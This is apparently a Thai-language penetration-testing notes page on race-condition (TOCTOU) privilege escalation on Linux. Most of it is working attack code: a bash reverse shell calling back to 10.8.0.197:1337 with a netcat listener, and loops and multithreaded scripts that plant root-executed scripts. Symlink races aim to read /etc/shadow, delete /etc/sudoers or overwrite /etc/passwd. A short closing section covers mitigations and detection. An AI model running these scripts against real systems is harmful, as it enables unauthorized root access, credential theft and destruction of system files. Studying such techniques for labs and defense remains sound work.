#privesc #race-condition #TOCTOU

# Race Condition Exploitation

> [!info] Overview
> Race Condition คือช่องโหว่ที่เกิดจากการที่ระบบต้องทำงานหลายขั้นตอนตามลำดับ และมีช่วงเวลา (time window) ระหว่างแต่ละขั้นตอนที่เราสามารถแทรกแซงได้ เทคนิคนี้มักใช้ใน privilege escalation เมื่อโปรแกรมตรวจสอบสิทธิ์ก่อนทำงาน แต่เราสามารถเปลี่ยนแปลงไฟล์ระหว่างการตรวจสอบกับการใช้งาน (TOCTOU)

## Table of Contents
- [[#TOCTOU Vulnerability]]
- [[#Basic Exploitation]]
- [[#Advanced TOCTOU Attacks]]
- [[#Symlink Race Conditions]]
- [[#Automated Exploitation]]

---

## TOCTOU Vulnerability

### What is TOCTOU?
TOCTOU = Time-of-Check to Time-of-Use

> [!warning] TOCTOU Window
> ช่วงเวลาระหว่างที่โปรแกรมตรวจสอบไฟล์ (Check) กับเวลาที่ใช้ไฟล์จริง (Use) คือช่องโหว่ที่เราสามารถแทรกแซงได้

### Vulnerable Code Pattern
```c
// Vulnerable C code example
if (access("/tmp/file", W_OK) == 0) {  // Time of Check
    sleep(1);  // Race window!
    fd = open("/tmp/file", O_WRONLY);   // Time of Use
    write(fd, data, size);
}
```

### Common Vulnerable Scenarios
```bash
# 1. Script ที่สร้างและลบ temporary directory
# โปรแกรม: สร้าง /tmp/service -> ทำงาน -> ลบ /tmp/service
# เราสามารถแทรก payload ระหว่างสร้างกับลบ

# 2. Backup script ที่ copy ไฟล์
# โปรแกรม: check permissions -> copy file
# เราสามารถเปลี่ยน symlink ระหว่าง check กับ copy

# 3. Log rotation script
# โปรแกรม: check log size -> compress -> delete
# เราสามารถแทรก symlink เพื่อลบไฟล์อื่น
```

---

## Basic Exploitation

### Example: Service Directory Race
ใช้ได้เมื่อมีโปรแกรมที่สร้าง temporary directory และรัน scripts ข้างใน

#### Vulnerable Program Behavior
```bash
# sudo check โปรแกรมที่มีช่องโหว่ race condition
# 1. สร้างโฟลเดอร์ /home/bill/service
# 2. กำหนดสิทธิ์ให้ทุกคนเขียนได้
# 3. รันทุกไฟล์ .sh ใน service directory ด้วยสิทธิ์ root
# 4. รอ 10 วินาที แล้วลบ service directory
```

### Manual Exploitation Steps
```bash
# 1. สร้าง exploit.sh (reverse shell)
# หา IP จาก: ip addr show tun0 หรือ ifconfig tun0
cat > exploit.sh << 'EOF'
#!/bin/bash
# สร้าง reverse shell กลับไปหา attacker
bash -i >& /dev/tcp/10.8.0.197/1337 0>&1
EOF

chmod +x exploit.sh

# 2. เปิด listener บนเครื่อง attacker
nc -nvlp 1337

# 3. รัน vulnerable program
sudo check &

# 4. แทรก exploit script ก่อนที่จะถูกลบ (ต้องทำเร็วภายใน 10 วินาที)
cp exploit.sh /home/bill/service/exploit.sh
```

### Automated Exploitation
```python
# exploit.py - วนลูปแทรกไฟล์อย่างต่อเนื่อง
import os
import sys

# แทรก exploit.sh เข้าไปเรื่อยๆ จนกว่าโปรแกรมจะรันมัน
while True:
    try:
        os.system('cp exploit.sh /home/bill/service/exploit.sh')
    except:
        pass
```

#### Full Exploitation Process
```bash
# 1. อัปโหลดไฟล์ไปยังเป้าหมาย
scp exploit.py bill@172.18.0.9:/home/bill/
scp exploit.sh bill@172.18.0.9:/home/bill/

# 2. เปิด listener
nc -nvlp 1337

# 3. บนเครื่องเป้าหมาย รัน 2 คำสั่งพร้อมกัน (ใช้ 2 terminal sessions)
# Terminal 1:
sudo check

# Terminal 2 (รันทันทีหลัง terminal 1):
python3 exploit.py
```

---

## Advanced TOCTOU Attacks

### Technique 1: File Content Race
เปลี่ยนเนื้อหาไฟล์ระหว่าง check และ use

```python
#!/usr/bin/env python3
# toctou_content_race.py
import os
import threading

target = "/tmp/config.txt"

# Thread 1: เขียนเนื้อหาปกติ
def write_safe():
    while True:
        with open(target, 'w') as f:
            f.write("safe_content")

# Thread 2: เขียน payload
def write_malicious():
    while True:
        with open(target, 'w') as f:
            f.write("malicious_payload\nchmod +s /bin/bash")

# รัน 2 threads พร้อมกัน
t1 = threading.Thread(target=write_safe)
t2 = threading.Thread(target=write_malicious)
t1.start()
t2.start()
```

### Technique 2: Permission Race
เปลี่ยน permission ระหว่างการตรวจสอบ

```bash
#!/bin/bash
# permission_race.sh
# ใช้กับโปรแกรมที่ตรวจสอบ permission ก่อนเขียนไฟล์

TARGET="/tmp/sensitive"

# สร้างไฟล์ปลอม
touch $TARGET
chmod 644 $TARGET

# รัน vulnerable program ที่จะเขียนข้อมูล sensitive
vulnerable_program &
PID=$!

# แข่งขันเปลี่ยน permission
while kill -0 $PID 2>/dev/null; do
    chmod 777 $TARGET 2>/dev/null
done

# อ่านข้อมูล sensitive ที่โปรแกรมเขียนไว้
cat $TARGET
```

### Technique 3: Inotify-based Race
ใช้ inotify เพื่อตรวจจับการเข้าถึงไฟล์และแทรกแซงทันที

```bash
#!/bin/bash
# inotify_race.sh
# ต้องติดตั้ง inotify-tools: apt-get install inotify-tools

WATCH_DIR="/home/bill/service"
EXPLOIT="/tmp/exploit.sh"

# Monitor directory สำหรับ CREATE events
inotifywait -m -e create "$WATCH_DIR" | while read path action file; do
    echo "Detected: $action on $file"
    # ทันทีที่ service directory ถูกสร้าง ให้แทรก exploit
    cp "$EXPLOIT" "$WATCH_DIR/exploit.sh"
    chmod +x "$WATCH_DIR/exploit.sh"
done
```

---

## Symlink Race Conditions

> [!danger] Symlink Attacks
> การใช้ symbolic links เพื่อหลอกให้โปรแกรมเข้าถึงไฟล์ที่เราต้องการ

### Basic Symlink Race
```bash
#!/bin/bash
# symlink_race.sh

TARGET="/tmp/logfile"
SENSITIVE="/etc/shadow"

# สร้างไฟล์ปกติก่อน
echo "normal log" > $TARGET

# รัน vulnerable program
vulnerable_backup_script &

# แข่งขันสร้าง symlink ไปยังไฟล์ sensitive
while true; do
    rm -f $TARGET
    ln -s $SENSITIVE $TARGET
    rm -f $TARGET
    touch $TARGET
done
```

### Exploitation Example: Log Rotation
```python
#!/usr/bin/env python3
# symlink_log_race.py
import os
import time

logfile = "/var/log/app.log"
target = "/etc/sudoers"

# วนลูปสร้างและลบ symlink
while True:
    try:
        # ลบไฟล์ปกติ
        os.remove(logfile)
        # สร้าง symlink ไปยัง target
        os.symlink(target, logfile)
        time.sleep(0.0001)  # Small delay
        # ลบ symlink
        os.remove(logfile)
        # สร้างไฟล์ปกติกลับมา
        open(logfile, 'w').close()
    except:
        pass

# ในขณะที่รัน script นี้ ให้รัน log rotation script
# ถ้าโปรแกรม log rotation ลบ "logfile" มันจะลบ /etc/sudoers แทน
```

---

## Automated Exploitation

### Multi-threaded Race Attack
```python
#!/usr/bin/env python3
# multithread_race.py
import os
import sys
import threading
import time

TARGET_DIR = "/home/bill/service"
EXPLOIT_SH = "/home/bill/exploit.sh"
NUM_THREADS = 50  # เพิ่มจำนวน threads เพื่อเพิ่มโอกาสชนะ race

def race_worker():
    """Worker thread ที่พยายามแทรก exploit อย่างต่อเนื่อง"""
    while True:
        try:
            # คัดลอก exploit script
            os.system(f'cp {EXPLOIT_SH} {TARGET_DIR}/exploit_{threading.get_ident()}.sh')
            # ทำให้ execute ได้
            os.system(f'chmod +x {TARGET_DIR}/exploit_{threading.get_ident()}.sh')
        except Exception as e:
            pass
        time.sleep(0.001)  # หน่วงเวลาเล็กน้อย

# สร้าง multiple threads เพื่อเพิ่มโอกาสชนะ race
print(f"[+] Starting {NUM_THREADS} race threads...")
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=race_worker, daemon=True)
    t.start()
    threads.append(t)
    print(f"[+] Thread {i+1} started")

# รอให้ threads ทำงาน
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopping race attack...")
    sys.exit(0)
```

### Bash One-liner Race
```bash
# แข่งขันแทรกไฟล์โดยใช้ bash loop
while true; do cp exploit.sh /home/bill/service/exploit.sh 2>/dev/null; done &

# รัน vulnerable program
sudo check

# หยุด loop
kill %1
```

---

## Detection and Mitigation

> [!note] Prevention Techniques
> - ใช้ file descriptors แทนการเปิดไฟล์หลายครั้ง
> - ใช้ O_CREAT | O_EXCL flags เมื่อสร้างไฟล์
> - Avoid TOCTOU by using fstat() instead of stat()
> - ใช้ secure temporary directories
> - Implement proper locking mechanisms

### Safe Code Example
```c
// ปลอดภัยกว่า: เปิดไฟล์ครั้งเดียวและใช้ fstat
int fd = open("/tmp/file", O_RDWR | O_CREAT | O_EXCL, 0600);
if (fd == -1) {
    perror("open");
    exit(1);
}

struct stat st;
if (fstat(fd, &st) == -1) {  // ใช้ fstat แทน stat
    perror("fstat");
    close(fd);
    exit(1);
}

// ทำงานกับ fd ต่อไป...
```

### Detection Commands
```bash
# ตรวจจับ symlink changes ที่ผิดปกติ
auditctl -w /tmp -p w -k tmp_changes

# Monitor process creation ด้วย pspy
./pspy64 -pf -i 100

# ตรวจสอบ race condition vulnerabilities ในโค้ด
grep -r "access(" /usr/local/bin/
grep -r "stat.*open" /usr/local/bin/
```

---

## Tools and Resources

### Exploitation Tools
- [[Python]] - สำหรับเขียน race condition scripts
- [[inotify-tools]] - monitor filesystem events
- [[strace]] - trace system calls เพื่อหา race windows
- [[ltrace]] - trace library calls

### Useful Scripts
```bash
# ติดตั้ง inotify-tools
sudo apt-get install inotify-tools

# Monitor directory สำหรับ race conditions
inotifywait -m -r -e create,modify,delete /tmp/

# Trace system calls ของ vulnerable program
strace -f -e trace=open,access,stat,lstat vulnerable_program
```

---

## Real-world Examples

### Example 1: /tmp Directory Race
```bash
# โปรแกรมหลายตัวสร้าง temporary files ใน /tmp
# โดยใช้ชื่อที่ predict ได้

# 1. หาชื่อ temporary file ที่โปรแกรมใช้
strace -f vulnerable_program 2>&1 | grep "/tmp"

# 2. สร้าง symlink ก่อนที่โปรแกรมจะสร้างไฟล์
ln -s /etc/passwd /tmp/predictable_name

# 3. รัน vulnerable program
# มันจะเขียนข้อมูลลง /etc/passwd แทน
```

### Example 2: Privilege Escalation via SUID Binary
```bash
# SUID binary ที่มีช่องโหว่ TOCTOU
# มันตรวจสอบว่าเราเป็นเจ้าของไฟล์ก่อนประมวลผล

# 1. สร้างไฟล์ที่เราเป็นเจ้าของ
touch /tmp/myfile

# 2. แข่งขันเปลี่ยนเป็น symlink
while true; do
    rm /tmp/myfile
    ln -s /etc/shadow /tmp/myfile
    rm /tmp/myfile
    touch /tmp/myfile
done &

# 3. รัน SUID binary ซ้ำๆ
while true; do /usr/bin/vulnerable_suid /tmp/myfile; done
```

---

## Related Techniques
- [[Privilege Escalation]]
- [[Symlink Attack]]
- [[File Permission Exploitation]]
- [[SUID Binary Exploitation]]

## References
- CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
- OWASP: Race Conditions
- HackTricks: Linux Privilege Escalation - Race Conditions
